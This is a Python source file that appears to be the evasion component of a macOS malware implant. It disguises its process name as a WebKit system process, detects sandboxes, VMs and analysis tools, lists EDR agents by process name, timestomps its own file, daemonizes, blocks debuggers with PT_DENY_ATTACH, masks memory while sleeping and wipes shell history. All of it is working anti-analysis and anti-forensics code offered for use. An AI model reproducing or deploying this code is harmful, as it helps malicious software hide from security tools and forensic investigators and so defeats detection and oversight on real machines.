import os
import sys
import ctypes
import ctypes.util
import subprocess


def hide_process_name(new_name='com.apple.WebKit.Networking'):
    """Disguise process name to look like a macOS system process"""
    try:
        libc = ctypes.CDLL(ctypes.util.find_library('c'), use_errno=True)
        libc.setprogname(new_name.encode())
        return True
    except Exception:
        return False


def detect_sandbox():
    """Detect macOS sandbox/VM environments"""
    import time
    score = 0

    # Check for VM indicators
    try:
        result = subprocess.run(['system_profiler', 'SPHardwareDataType'],
                                capture_output=True, text=True, timeout=5)
        hw = result.stdout.lower()
        for sig in ['vmware', 'virtualbox', 'parallels', 'qemu']:
            if sig in hw:
                score += 20
    except Exception:
        pass

    # CPU count
    try:
        if (os.cpu_count() or 1) < 2:
            score += 15
    except Exception:
        pass

    # Check for analysis tools
    try:
        ps = subprocess.run(['ps', 'aux'], capture_output=True, text=True, timeout=5).stdout.lower()
        for tool in ['wireshark', 'lldb', 'dtrace', 'instruments', 'fsmon', 'filemon', 'procmon']:
            if tool in ps:
                score += 15
                break
    except Exception:
        pass

    # User artifacts
    try:
        home = os.path.expanduser('~')
        file_count = 0
        for d in ['Desktop', 'Documents', 'Downloads', 'Library/Safari']:
            path = os.path.join(home, d)
            if os.path.isdir(path):
                try:
                    file_count += len(os.listdir(path))
                except Exception:
                    pass
        if file_count < 5:
            score += 15
    except Exception:
        pass

    # Screen resolution
    try:
        result = subprocess.run(['system_profiler', 'SPDisplaysDataType'],
                                capture_output=True, text=True, timeout=5)
        if 'resolution' not in result.stdout.lower():
            score += 10
    except Exception:
        pass

    if score >= 35:
        time.sleep(score)


def detect_edr_processes():
    """Detect macOS EDR agents"""
    edr_signatures = {
        'CrowdStrike Falcon': ['falconctl', 'falcon', 'csfalcond'],
        'SentinelOne': ['sentinelagent', 'sentinelone'],
        'Carbon Black': ['cbagent', 'cbdaemon', 'cbosxsensorservice'],
        'Sophos': ['sophosantivirusd', 'sophosservicemanager'],
        'Jamf Protect': ['jamfprotect', 'jamf'],
        'Microsoft Defender': ['wdavdaemon', 'mdatp'],
    }

    detected = {}
    try:
        ps = subprocess.run(['ps', 'aux'], capture_output=True, text=True, timeout=5).stdout.lower()
        for edr_name, signatures in edr_signatures.items():
            for sig in signatures:
                if sig in ps:
                    if edr_name not in detected:
                        detected[edr_name] = []
                    detected[edr_name].append(sig)
    except Exception:
        pass
    return detected


def timestomp(file_path, reference_file='/usr/bin/login'):
    """Copy timestamps from a reference file"""
    try:
        ref_stat = os.stat(reference_file)
        os.utime(file_path, (ref_stat.st_atime, ref_stat.st_mtime))
        return True
    except Exception:
        return False


def daemonize():
    """Double-fork daemonize"""
    try:
        if os.fork() > 0:
            os._exit(0)
        os.setsid()
        if os.fork() > 0:
            os._exit(0)
        sys.stdout.flush()
        sys.stderr.flush()
        devnull = os.open(os.devnull, os.O_RDWR)
        os.dup2(devnull, sys.stdin.fileno())
        os.dup2(devnull, sys.stdout.fileno())
        os.dup2(devnull, sys.stderr.fileno())
        os.close(devnull)
        return True
    except Exception:
        return False


def disable_core_dumps():
    """Prevent core dumps"""
    try:
        import resource
        resource.setrlimit(resource.RLIMIT_CORE, (0, 0))
        return True
    except Exception:
        return False


def evade_ptrace():
    """Set PT_DENY_ATTACH to prevent debugger attachment

    Works against: lldb, dtrace, debugging-based analysis
    macOS-specific ptrace flag that prevents any debugger from attaching.
    """
    try:
        libc = ctypes.CDLL(ctypes.util.find_library('c'), use_errno=True)
        PT_DENY_ATTACH = 31
        libc.ptrace(PT_DENY_ATTACH, 0, 0, 0)
        return True
    except Exception:
        return False


def sleep_encrypt(sleep_seconds, data_to_protect=None):
    """XOR-encrypt sensitive data during sleep intervals"""
    import time
    import random

    if data_to_protect is None:
        time.sleep(sleep_seconds)
        return

    try:
        key = os.urandom(16)
        encrypted = bytearray(len(data_to_protect))
        for i in range(len(data_to_protect)):
            encrypted[i] = data_to_protect[i] ^ key[i % 16]
        for i in range(len(data_to_protect)):
            data_to_protect[i] = random.randint(0, 255)
        time.sleep(sleep_seconds)
        for i in range(len(encrypted)):
            data_to_protect[i] = encrypted[i] ^ key[i % 16]
        del encrypted, key
    except Exception:
        time.sleep(sleep_seconds)


def clear_shell_history():
    """Clear shell history files"""
    try:
        home = os.path.expanduser('~')
        for hf in ['.bash_history', '.zsh_history', '.python_history']:
            path = os.path.join(home, hf)
            if os.path.exists(path):
                with open(path, 'w') as f:
                    pass
        os.environ.pop('HISTFILE', None)
        os.environ['HISTSIZE'] = '0'
        return True
    except Exception:
        return False


def init_evasion():
    """Master evasion init for macOS"""
    detect_sandbox()
    disable_core_dumps()
    evade_ptrace()
    hide_process_name()
    try:
        timestomp(os.path.abspath(sys.argv[0]))
    except Exception:
        pass
